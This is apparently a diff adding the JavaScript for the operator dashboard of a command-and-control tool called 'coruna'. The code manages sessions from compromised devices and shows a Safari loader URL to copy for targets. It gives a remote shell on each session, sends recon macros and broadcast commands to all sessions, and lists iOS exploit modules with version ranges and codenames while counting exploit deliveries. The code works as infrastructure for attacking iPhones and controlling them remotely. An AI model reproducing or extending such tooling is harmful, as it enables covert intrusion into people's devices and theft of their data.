+                cmdHistoryIdx: -1,
+            };
+
+            const el = (id) => document.getElementById(id);
+
+            function showToast(msg) {
+                const container = el("toastContainer");
+                const node = document.createElement("div");
+                node.className = "toast";
+                node.textContent = msg;
+                container.appendChild(node);
+                setTimeout(() => node.remove(), 3200);
+            }
+
+            function formatBytes(bytes) {
+                if (!bytes || bytes < 1024) return `${bytes || 0} B`;
+                if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
+                return `${(bytes / 1048576).toFixed(2)} MB`;
+            }
+
+            function formatUptime(sec) {
+                const h = String(Math.floor(sec / 3600)).padStart(2, "0");
+                const m = String(Math.floor((sec % 3600) / 60)).padStart(2, "0");
+                const s = String(sec % 60).padStart(2, "0");
+                return `${h}:${m}:${s}`;
+            }
+
+            // Tab switching
+            document.querySelectorAll(".tab-btn").forEach((btn) => {
+                btn.addEventListener("click", () => {
+                    const tab = btn.dataset.tab;
+                    document.querySelectorAll(".tab-btn").forEach((b) => b.classList.toggle("active", b === btn));
+                    document.querySelectorAll(".tab-panel").forEach((p) => p.classList.toggle("active", p.id === `tab-${tab}`));
+                    if (tab === "arsenal") loadArsenal();
+                    if (tab === "config") loadConfig();
+                });
+            });
+
+            // Status rendering
+            function updateStatusUI(st) {
+                if (!st) return;
+                state.uptimeSeconds = st.uptime_seconds || 0;
+                el("metricUptime").textContent = formatUptime(state.uptimeSeconds);
+                el("metricActiveSessions").textContent = st.active_sessions_count ?? 0;
+                el("metricTotalSessions").textContent = `${st.total_sessions_count ?? 0} total connected`;
+                el("metricC2Endpoint").textContent = `${st.c2_host}:${st.c2_port}`;
+                el("metricExploitHits").textContent = st.exploit_deliveries ?? 0;
+                el("metricHttpTotal").textContent = `${st.total_http_requests ?? 0} HTTP requests`;
+                el("metricWebBind").textContent = `HTTP ${st.web_host}:${st.web_port}`;
+                el("tabBadgeSessions").textContent = st.active_sessions_count ?? 0;
+
+                const lanIp = (st.lan_ips && st.lan_ips[0]) || window.location.hostname || "127.0.0.1";
+                const portPart = st.web_port && st.web_port !== 80 ? `:${st.web_port}` : "";
+                el("targetSafariUrl").textContent = `http://${lanIp}${portPart}/coruna/group.html`;
+            }
+
+            setInterval(() => {
+                state.uptimeSeconds += 1;
+                el("metricUptime").textContent = formatUptime(state.uptimeSeconds);
+            }, 1000);
+
+            el("btnCopyTargetUrl").addEventListener("click", () => {
+                const url = el("targetSafariUrl").textContent;
+                navigator.clipboard.writeText(url).then(() => showToast(`Copied ${url}`));
+            });
+
+            // Sessions list rendering
+            function renderSessionsList() {
+                const container = el("sessionsListContainer");
+                const active = state.sessions.active || [];
+                const closed = state.sessions.closed || [];
+                el("metricActiveSessions").textContent = active.length;
+                el("metricTotalSessions").textContent = `${state.sessions.total_count || active.length} total connected`;
+                el("tabBadgeSessions").textContent = active.length;
+
+                // Auto-select first active session if none selected
+                if (!state.selectedSessionId && active.length > 0) {
+                    selectSession(active[0].id);
+                    return;
+                }
+
+                if (active.length === 0 && closed.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state">
+                            No active C2 sessions.<br/>
+                            Open the loader URL on a target device or click <strong>+ Spawn Test Session</strong> above.
+                        </div>`;
+                    updateTerminalHeader();
+                    return;
+                }
+
+                let html = "";
+                active.forEach((s) => {
+                    const isSel = s.id === state.selectedSessionId;
+                    html += `
+                        <div class="session-item ${isSel ? "selected" : ""}" data-sid="${s.id}">
+                            <div class="session-top">
+                                <span class="session-id-badge">
+                                    <span class="status-dot"></span>
+                                    [${s.id}]
+                                </span>
+                                <span class="session-host">${s.ip_address}:${s.port}</span>
+                            </div>
+                            <div class="session-meta">
+                                <span>${s.commands_sent || 0} cmds • ${formatBytes(s.bytes_received || 0)}</span>
+                                <span>${(s.connected_at || "").split(" ")[1] || ""}</span>
+                            </div>
+                        </div>`;
+                });
+
+                if (closed.length > 0) {
+                    html += `<div style="font-size:0.68rem; text-transform:uppercase; color:var(--text-muted); margin:8px 4px 2px; letter-spacing:0.06em;">Disconnected History (${closed.length})</div>`;
+                    closed.slice(0, 12).forEach((s) => {
+                        const isSel = s.id === state.selectedSessionId;
+                        html += `
+                            <div class="session-item closed-item ${isSel ? "selected" : ""}" data-sid="${s.id}">
+                                <div class="session-top">
+                                    <span class="session-id-badge" style="color:var(--text-secondary);">
+                                        <span class="status-dot closed"></span>
+                                        [${s.id}]
+                                    </span>
+                                    <span class="session-host">${s.ip_address}:${s.port}</span>
+                                </div>
+                                <div class="session-meta">
+                                    <span>CLOSED</span>
+                                    <span>${(s.disconnected_at || s.connected_at || "").split(" ")[1] || ""}</span>
+                                </div>
+                            </div>`;
+                    });
+                }
+
+                container.innerHTML = html;
+                container.querySelectorAll(".session-item").forEach((node) => {
+                    node.addEventListener("click", () => selectSession(node.dataset.sid));
+                });
+                updateTerminalHeader();
+            }
+
+            function findSession(sid) {
+                return (
+                    (state.sessions.active || []).find((s) => s.id === sid) ||
+                    (state.sessions.closed || []).find((s) => s.id === sid)
+                );
+            }
+
+            async function selectSession(sid) {
+                state.selectedSessionId = sid;
+                renderSessionsList();
+                try {
+                    const res = await fetch(`/api/sessions/${encodeURIComponent(sid)}`);
+                    if (res.ok) {
+                        const data = await res.json();
+                        state.transcripts[sid] = data.transcript || [];
+                        renderTranscript(sid);
+                    }
+                } catch (_) {}
+                updateTerminalHeader();
+                const input = el("terminalCmdInput");
+                if (!input.disabled) input.focus();
+            }
+
+            function updateTerminalHeader() {
+                const sess = findSession(state.selectedSessionId);
+                const badge = el("termHeaderBadge");
+                const disconnectBtn = el("btnDisconnectSession");
+                const input = el("terminalCmdInput");
+                const sendBtn = el("terminalSendBtn");
+                const prefix = el("terminalPromptPrefix");
+
+                if (!sess) {
+                    el("termHeaderTitle").textContent = "Interactive Shell // No Session Selected";
+                    badge.style.display = "none";
+                    disconnectBtn.style.display = "none";
+                    input.disabled = true;
+                    sendBtn.disabled = true;
+                    prefix.textContent = "(no-session)$";
+                    return;
+                }
+
+                const isActive = sess.status === "active";
+                el("termHeaderTitle").textContent = `Session [${sess.id}] — ${sess.ip_address}:${sess.port}`;
+                badge.style.display = "inline-block";
+                badge.textContent = isActive ? "ACTIVE SHELL" : "TERMINATED";
+                badge.style.color = isActive ? "#34d399" : "#f87171";
+                badge.style.borderColor = isActive ? "rgba(16,185,129,0.4)" : "rgba(244,63,94,0.4)";
+                badge.style.background = isActive ? "rgba(16,185,129,0.12)" : "rgba(244,63,94,0.12)";
+                disconnectBtn.style.display = isActive ? "inline-flex" : "none";
+                input.disabled = !isActive;
+                sendBtn.disabled = !isActive;
+                prefix.textContent = isActive ? `coruna@${sess.id}$` : `(closed:${sess.id})$`;
+            }
+
+            function escapeHtml(str) {
+                return String(str)
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;");
+            }
+
+            function renderTranscript(sid) {
+                if (sid !== state.selectedSessionId) return;
+                const viewport = el("terminalViewport");
+                const list = state.transcripts[sid] || [];
+                if (list.length === 0) {
+                    viewport.innerHTML = `<div class="term-system">[*] Session [${escapeHtml(sid)}] attached. Ready for commands.</div>`;
+                    return;
+                }
+                viewport.innerHTML = list.map((entry) => formatTranscriptEntryHTML(entry)).join("");
+                viewport.scrollTop = viewport.scrollHeight;
+            }
+
+            function formatTranscriptEntryHTML(entry) {
+                const ts = `<span class="term-ts">[${escapeHtml(entry.timestamp || "")}]</span>`;
+                if (entry.kind === "input") {
+                    const src = entry.source ? `(${escapeHtml(entry.source)}) ` : "";
+                    return `<div class="term-entry term-input">${ts}${src}$ ${escapeHtml(entry.text)}</div>`;
+                }
+                if (entry.kind === "system") {
+                    return `<div class="term-entry term-system">${ts}${escapeHtml(entry.text)}</div>`;
+                }
+                return `<span class="term-entry term-output">${escapeHtml(entry.text)}</span>`;
+            }
+
+            function appendTranscriptEntry(sid, entry) {
+                if (!state.transcripts[sid]) state.transcripts[sid] = [];
+                state.transcripts[sid].push(entry);
+                if (sid === state.selectedSessionId) {
+                    const viewport = el("terminalViewport");
+                    viewport.insertAdjacentHTML("beforeend", formatTranscriptEntryHTML(entry));
+                    viewport.scrollTop = viewport.scrollHeight;
+                }
+            }
+
+            // Sending commands
+            async function sendSessionCommand(sid, command) {
+                if (!sid || !command.trim()) return;
+                const cmd = command.trim();
+                state.cmdHistory.unshift(cmd);
+                state.cmdHistoryIdx = -1;
+
+                if (state.ws && state.ws.readyState === WebSocket.OPEN) {
+                    state.ws.send(JSON.stringify({ action: "send_command", session_id: sid, command: cmd }));
+                } else {
+                    const res = await fetch(`/api/sessions/${encodeURIComponent(sid)}/command`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ command: cmd }),
+                    });
+                    if (!res.ok) {
+                        const err = await res.json().catch(() => ({}));
+                        showToast(err.error || "Failed sending command");
+                    }
+                }
+            }
+
+            el("terminalForm").addEventListener("submit", (e) => {
+                e.preventDefault();
+                const input = el("terminalCmdInput");
+                const cmd = input.value;
+                if (!cmd.trim() || !state.selectedSessionId) return;
+                input.value = "";
+                sendSessionCommand(state.selectedSessionId, cmd);
+            });
+
+            el("terminalCmdInput").addEventListener("keydown", (e) => {
+                if (e.key === "ArrowUp") {
+                    e.preventDefault();
+                    if (state.cmdHistoryIdx + 1 < state.cmdHistory.length) {
+                        state.cmdHistoryIdx += 1;
+                        e.target.value = state.cmdHistory[state.cmdHistoryIdx];
+                    }
+                } else if (e.key === "ArrowDown") {
+                    e.preventDefault();
+                    if (state.cmdHistoryIdx > 0) {
+                        state.cmdHistoryIdx -= 1;
+                        e.target.value = state.cmdHistory[state.cmdHistoryIdx];
+                    } else {
+                        state.cmdHistoryIdx = -1;
+                        e.target.value = "";
+                    }
+                }
+            });
+
+            // Quick Recon Macro Chips
+            document.querySelectorAll(".macro-chip").forEach((chip) => {
+                chip.addEventListener("click", () => {
+                    if (!state.selectedSessionId) {
+                        showToast("Select or spawn an active session first");
+                        return;
+                    }
+                    sendSessionCommand(state.selectedSessionId, chip.dataset.cmd);
+                });
+            });
+
+            // Broadcast form
+            el("broadcastForm").addEventListener("submit", async (e) => {
+                e.preventDefault();
+                const input = el("broadcastInput");
+                const cmd = input.value.trim();
+                if (!cmd) return;
+                input.value = "";
+                const res = await fetch("/api/sessions/broadcast", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ command: cmd }),
+                });
+                const data = await res.json().catch(() => ({}));
+                showToast(`Broadcast sent to ${(data.sent_to || []).length} active session(s)`);
+            });
+
+            // Terminal Controls
+            el("btnToggleTimestamps").addEventListener("click", (e) => {
+                state.showTimestamps = !state.showTimestamps;
+                el("terminalViewport").classList.toggle("hide-ts", !state.showTimestamps);
+                e.target.textContent = `Timestamps: ${state.showTimestamps ? "ON" : "OFF"}`;
+            });
+
+            el("btnClearTerminal").addEventListener("click", () => {
+                el("terminalViewport").innerHTML = `<div class="term-system">[*] Terminal display cleared.</div>`;
+            });
+
+            el("btnDownloadTranscript").addEventListener("click", () => {
+                const sid = state.selectedSessionId || "session";
+                const text = el("terminalViewport").innerText;
+                const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+                const a = document.createElement("a");
+                a.href = URL.createObjectURL(blob);
+                a.download = `coruna-${sid}.log`;
+                a.click();
+            });
+
+            el("btnDisconnectSession").addEventListener("click", async () => {
+                if (!state.selectedSessionId) return;
+                await fetch(`/api/sessions/${encodeURIComponent(state.selectedSessionId)}`, { method: "DELETE" });
+                showToast(`Session ${state.selectedSessionId} disconnected`);
+            });
+
+            el("btnRefreshSessions").addEventListener("click", async () => {
+                const res = await fetch("/api/sessions");
+                if (res.ok) {
+                    state.sessions = await res.json();
+                    renderSessionsList();
+                }
+            });
+
+            el("btnSpawnTest").addEventListener("click", async () => {
+                const btn = el("btnSpawnTest");
+                btn.disabled = true;
+                try {
+                    const res = await fetch("/api/sessions/test", { method: "POST" });
+                    const data = await res.json();
+                    if (data.ok) {
+                        state.sessions = data.sessions;
+                        const newest = state.sessions.active[state.sessions.active.length - 1];
+                        if (newest) await selectSession(newest.id);
+                        showToast(`Loopback C2 session [${newest ? newest.id : "new"}] connected!`);
+                    } else {
+                        showToast(data.error || "Could not spawn test session");
+                    }
+                } catch (err) {
+                    showToast("Error spawning test session");
+                } finally {
+                    btn.disabled = false;
+                }
+            });
+
+            // Telemetry Logs rendering
+            function renderLogsTable() {
+                el("tabBadgeLogs").textContent = state.logs.length;
+                const tbody = el("telemetryTableBody");
+                const q = state.logSearch.toLowerCase();
+                const filtered = state.logs.filter((item) => {
+                    if (state.logFilter !== "all" && item.category !== state.logFilter) return false;
+                    if (q) {
+                        const hay = `${item.ip} ${item.path} ${item.label} ${item.method}`.toLowerCase();
+                        if (!hay.includes(q)) return false;
+                    }
+                    return true;
+                });
+
+                if (filtered.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="7" class="empty-state">No matching telemetry events.</td></tr>`;
+                    return;
+                }
+
+                tbody.innerHTML = filtered.slice(0, 200).map((item) => {
+                    const catClass = `cat-${item.category || "http"}`;
+                    const statusColor = item.status >= 400 ? "#f87171" : item.status >= 300 ? "#fbbf24" : "#34d399";
+                    return `
+                        <tr>
+                            <td style="color:var(--text-muted);">${escapeHtml(item.timestamp)}</td>
+                            <td><span class="stage-pill ${catClass}">${escapeHtml(item.label)}</span></td>
+                            <td>${escapeHtml(item.ip)}</td>
+                            <td>${escapeHtml(item.method)}</td>
+                            <td style="color:#f8fafc;">${escapeHtml(item.path)}</td>
+                            <td style="color:${statusColor}; font-weight:700;">${escapeHtml(item.status)}</td>
+                            <td style="color:var(--text-muted);">${item.duration_ms ? `${item.duration_ms} ms` : "—"}</td>
+                        </tr>`;
+                }).join("");
+            }
+
+            document.querySelectorAll("#logCategoryFilters button").forEach((btn) => {
+                btn.addEventListener("click", () => {
+                    state.logFilter = btn.dataset.filter;
+                    document.querySelectorAll("#logCategoryFilters button").forEach((b) =>
+                        b.classList.toggle("btn-primary", b === btn)
+                    );
+                    renderLogsTable();
+                });
+            });
+
+            el("logSearchInput").addEventListener("input", (e) => {
+                state.logSearch = e.target.value;
+                renderLogsTable();
+            });
+
+            el("btnClearLogs").addEventListener("click", async () => {
+                await fetch("/api/logs", { method: "DELETE" });
+                state.logs = [];
+                renderLogsTable();
+            });
+
+            // Arsenal & Payloads Inspector
+            async function loadArsenal() {
+                const res = await fetch("/api/payloads");
+                if (!res.ok) return;
+                const data = await res.json();
+                const stages = data.stages || [];
+                const manifest = data.manifest || {};
+                const hashKeys = Object.keys(manifest);
+
+                el("arsenalSummaryText").textContent = `${stages.length} Exploit Modules • ${hashKeys.length} Target Hash Bundles`;
+
+                const grid = el("stagesGridContainer");
+                grid.innerHTML = stages.map((st) => `
+                    <div class="stage-card">
+                        <div class="stage-card-top">
+                            <span class="stage-pill cat-exploit">${escapeHtml(st.stage)}</span>
+                            <span class="metric-sub">${formatBytes(st.size)}</span>
+                        </div>
+                        <div class="stage-filename">${escapeHtml(st.filename)}</div>
+                        <div class="session-meta">
+                            <span>iOS: ${escapeHtml(st.ios_range)}</span>
+                            <span>Codename: ${escapeHtml(st.codename)}</span>
+                        </div>
+                        <div style="display:flex; gap:6px; margin-top:4px;">
+                            <button class="btn btn-sm" data-inspect="${escapeHtml(st.filename)}">Inspect Source</button>
+                            <a class="btn btn-sm" href="${escapeHtml(st.url)}" target="_blank" rel="noopener">Raw ↗</a>
+                        </div>
+                    </div>
+                `).join("");
+
+                grid.querySelectorAll("[data-inspect]").forEach((btn) => {
+                    btn.addEventListener("click", () => openSourceModal(btn.dataset.inspect));
+                });
+
+                const mbody = el("manifestTableBody");
+                mbody.innerHTML = hashKeys.map((hash) => {
+                    const item = manifest[hash];
+                    const files = (item.entries || []).map((e) => e.file).join(", ");
+                    return `
+                        <tr>
+                            <td style="color:var(--accent-cyan); font-weight:600;">${escapeHtml(hash)}</td>
+                            <td>${item.entry_count} files</td>
+                            <td>${formatBytes(item.total_size)}</td>
+                            <td style="color:var(--text-secondary);">${escapeHtml(files)}</td>
+                        </tr>`;
+                }).join("");
+            }
+
+            async function openSourceModal(file) {
+                const res = await fetch(`/api/payloads/source?file=${encodeURIComponent(file)}`);
+                if (!res.ok) {
+                    showToast("Unable to load source file");
+                    return;
+                }
+                const data = await res.json();
+                el("sourceModalTitle").textContent = `${data.file} (${formatBytes(data.size)})`;
+                el("sourceModalCode").textContent = data.content;
+                el("sourceModal").classList.add("open");
+            }
+
+            el("btnInspectManifest").addEventListener("click", () => openSourceModal("payloads/manifest.json"));
+            el("btnCloseModal").addEventListener("click", () => el("sourceModal").classList.remove("open"));
+            window.addEventListener("keydown", (e) => {
+                if (e.key === "Escape") el("sourceModal").classList.remove("open");
+            });
+
+            // Configuration Tab
+            async function loadConfig() {
+                const res = await fetch("/api/config");
+                if (!res.ok) return;
+                const data = await res.json();
+                const cfg = data.effective || data.config || {};
+                ["web_server_ip", "web_server_port", "c2_bind", "c2_port", "exploit_templates_dir", "static_files_dir"].forEach((k) => {
+                    const input = el(`cfg_${k}`);
+                    if (input && cfg[k] !== undefined) input.value = cfg[k];
+                });
+            }
+
+            el("btnSaveConfig").addEventListener("click", async () => {
+                const payload = {};
+                ["web_server_ip", "web_server_port", "c2_bind", "c2_port", "exploit_templates_dir", "static_files_dir"].forEach((k) => {
+                    payload[k] = el(`cfg_${k}`).value;
+                });
+                const res = await fetch("/api/config", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                });
+                const data = await res.json();
+                if (res.ok && data.ok) {
+                    showToast("Configuration saved to config.json");
+                } else {
+                    showToast(data.error || "Failed saving configuration");
+                }
+            });
+
+            // Live WebSocket Connection
+            function connectWebSocket() {
+                const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
+                const ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+                state.ws = ws;
+
+                ws.onopen = () => {
+                    el("wsStatusPill").classList.remove("offline");
+                    el("wsStatusText").textContent = "LIVE TELEMETRY";
+                };
+
+                ws.onmessage = (evt) => {
+                    let msg;
+                    try {
+                        msg = JSON.parse(evt.data);
+                    } catch (_) {
+                        return;
+                    }
+
+                    if (msg.event === "init") {
+                        updateStatusUI(msg.status);
+                        state.sessions = msg.sessions || { active: [], closed: [], total_count: 0 };
+                        state.logs = msg.logs || [];
+                        renderSessionsList();
+                        renderLogsTable();
+                    } else if (msg.event === "session_connected") {
+                        const s = msg.session;
+                        state.sessions.active = (state.sessions.active || []).filter((x) => x.id !== s.id);
+                        state.sessions.active.push(s);
+                        state.sessions.total_count = (state.sessions.total_count || 0) + 1;
+                        renderSessionsList();
+                        if (!state.selectedSessionId) selectSession(s.id);
+                        showToast(`New C2 session [${s.id}] from ${s.ip_address}`);
+                    } else if (msg.event === "session_closed") {
+                        const s = msg.session;
+                        state.sessions.active = (state.sessions.active || []).filter((x) => x.id !== s.id);
+                        state.sessions.closed = [s, ...(state.sessions.closed || []).filter((x) => x.id !== s.id)];
+                        renderSessionsList();
+                        appendTranscriptEntry(s.id, {
+                            timestamp: msg.timestamp,
+                            kind: "system",
+                            text: `[*] Session [${s.id}] disconnected.\n`,
+                        });
+                    } else if (msg.event === "session_command") {
+                        const sid = msg.session_id;
+                        if (msg.session) {
+                            state.sessions.active = (state.sessions.active || []).map((x) => (x.id === sid ? msg.session : x));
+                            renderSessionsList();
+                        }
+                        if (msg.entry) appendTranscriptEntry(sid, msg.entry);
+                    } else if (msg.event === "session_output") {
+                        const sid = msg.session_id;
+                        if (msg.session) {
+                            state.sessions.active = (state.sessions.active || []).map((x) => (x.id === sid ? msg.session : x));
+                            renderSessionsList();
+                        }
+                        if (msg.entry) appendTranscriptEntry(sid, msg.entry);
+                    } else if (msg.event === "http_log" && msg.log) {
+                        state.logs.unshift(msg.log);
+                        if (state.logs.length > 500) state.logs.pop();
+                        if (msg.log.category !== "c2") {
+                            const totalEl = el("metricHttpTotal");
+                            const curTotal = parseInt(totalEl.textContent, 10) || 0;
+                            totalEl.textContent = `${curTotal + 1} HTTP requests`;
+                            if (msg.log.category === "exploit" || msg.log.category === "payload") {
+                                const hitEl = el("metricExploitHits");
+                                hitEl.textContent = (parseInt(hitEl.textContent, 10) || 0) + 1;
+                            }
+                        }
+                        renderLogsTable();
+                    } else if (msg.event === "logs_cleared") {
+                        state.logs = [];
+                        renderLogsTable();
+                    }
+                };
+
+                ws.onclose = () => {
+                    el("wsStatusPill").classList.add("offline");
+                    el("wsStatusText").textContent = "RECONNECTING...";
+                    setTimeout(connectWebSocket, 2000);
+                };
+            }
+
+            connectWebSocket();
+        })();
+    </script>
+</body>
+</html>
